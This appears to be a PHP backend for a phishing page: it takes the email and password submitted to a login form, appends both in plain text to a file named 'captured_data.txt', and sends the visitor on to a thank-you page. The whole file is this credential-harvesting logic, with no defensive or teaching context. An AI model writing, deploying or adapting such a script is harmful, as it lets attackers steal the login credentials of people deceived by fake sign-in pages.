<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$email = $_POST['email'] ?? 'NO_EMAIL';
$password = $_POST['password'] ?? 'NO_PASSWORD';

$file = fopen("captured_data.txt", "a");
fwrite($file, "Email: $email | Password: $password\n");
fclose($file);

header("Location: thank_you.html");
?>
